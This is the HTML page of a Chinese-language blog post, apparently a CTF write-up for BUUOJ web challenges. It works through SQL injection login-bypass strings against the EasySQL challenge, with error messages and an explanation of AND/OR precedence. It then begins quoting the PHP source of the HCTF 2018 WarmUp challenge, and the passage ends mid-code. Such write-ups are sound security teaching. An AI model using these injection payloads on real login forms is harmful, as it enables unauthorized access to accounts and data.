@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/01/17/security/ctf/buuoj——web（一）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ——WEB（一）">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/01/17/Security/CTF/BUUOJ%E2%80%94%E2%80%94WEB%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-01-17T00:50:00.000Z">
+<meta property="article:modified_time" content="2023-04-28T08:48:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            BUUOJ——WEB（一） -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-3.jpg" alt="BUUOJ——WEB（一）" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">BUUOJ——WEB（一）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-01-17 08:50</span>
+        <span class="mobile">2023-01-17 08:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-04-28 16:48</span>
+            <span class="mobile">2023-04-28 16:48</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>一道确实很简单的sql注入题目，但是折磨了我半天，猜测后台语句大概如下:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> usr_table <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$pas&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>最基本的注入语句即可解决本题:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; 密码:1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">getFlag!  //用户名:1&#x27; or 1=1# 密码:1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h3 id="一些问题及尝试"><a href="#一些问题及尝试" class="headerlink" title="一些问题及尝试"></a>一些问题及尝试</h3><p><strong>不知道为什么最外部还包着一层单引号，注入回显报错时可能会出现前单后双的奇怪样子</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for the right syntax to use near &#x27;123&#x27;&#x27; at line 1 //用户名:1&#x27; 密码：123 的报错回显,在回显中引号二单一双一模一样</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27;&#x27; and password=&#x27;123&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>几组测试(any代表随便填):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for the right syntax to use near &#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;&#x27; at line 1  //用户名:&#x27;      密码：1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;&#x27;&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">getFlag!                                                    //用户名:&#x27;&#x27;     密码：1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;&#x27;&#x27;&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">getFlag!                                                    //用户名:&quot;      密码：1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;&quot;&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>不知道 <code>user=&#39;&#39;&#39;&#39; and</code> 这一段是怎么解析语法的，两组引号间没有任何连接符，第二组也没有任何效果</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1 密码:any</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27; or &quot;1&quot;=&quot;1&quot; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;any&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrongpassword!  //用户名:1&#x27; or &#x27;1&#x27;=&#x27;1 密码:123</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;423&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>不知道为什么多加一组or就可以无视密码栏，可能跟sql语句逻辑判定的规则有关？</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:any    密码：1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;any&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>注入密码后用户名好像没参加判准一样，可是又有</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:1&#x27; or 1=1# 密码:any</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27;&#x27; or 1=1#&#x27; and password=&#x27;any&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>于是就搞不清楚了，直接试图白盒()</p>
+<hr>
+<p>突然想通了：<strong>浏览器回显报错时会自添一层单引号以示引用，所以有一层单引号不是sql语句中的！</strong></p>
+<p>所以前面被这层单引号误导了!</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for the right syntax to use near &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;321&#x27;&#x27; at line 1  //用户名:1&quot; or &#x27;1&#x27;=&#x27;1 密码:321</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&quot; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;321&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>所以<strong>单双引号不能相互闭合，双引号被当成普通内容</strong></p>
+<hr>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrongpassword!  //用户名:&quot; 密码:123</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;&quot;&#x27; and password=&#x27;123&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>能说明<strong>双引号应该是被当做正常内容解析了</strong></p>
+<p>####3&#x2F;15更新：<br>SQL中逻辑判定先判断”and”再判断”or”</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1 密码:any</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27; or &quot;1&quot;=&quot;1&quot; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;any&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>在Select语句中，先看”and”两侧一真一假为假，再看第一个”or”一真一假为真，于是第二个”or”两侧一真一假必为真，和”and”右侧的真假性无关，所以”password”栏任意值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFlag!  //用户名:any    密码：1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;any&#x27; and password=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里也是同理，由于先”and”再”or”,”or”右侧必为真,表达式的值固定，用户名一栏随便填</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrongpassword!  //用户名:1&#x27; or &#x27;1&#x27;=&#x27;1 密码:123</span><br><span class="line">=&gt; select * from usr_table where user=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;423&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>那为什么用户栏这里就不行呢，因为”or”右侧的值是由表达式(‘1’&#x3D;’1’ and password&#x3D;’423’)决定的，password处值为假的情况下该表达式值为假，而”or”左侧的值也也为假，故此处的”or”无法锁定表达式的值</p>
+<hr>
+<p><strong>双引号会不会被当成两个单引号？</strong>(感觉不太科学，应该不会吧&#x3D; &#x3D;，毕竟底层编码应该不一样)</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>F12后得到提示”source.php”，访问该文件得到一份源码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;  <span class="comment">//确保非空且为字符</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//不满足则一票否决</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;  <span class="comment">//白名单检测一</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//不满足只是不返回TRUE</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(  //<span class="title function_ invoke__">mb_substr</span>(<span class="variable">$a</span>,<span class="number">0</span>,<span class="number">5</span>)取<span class="variable">$a</span>变量<span class="number">0</span>位置开始长度为<span class="number">5</span>的子串</span><br><span class="line">                <span class="variable">$page</span>,  </span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span 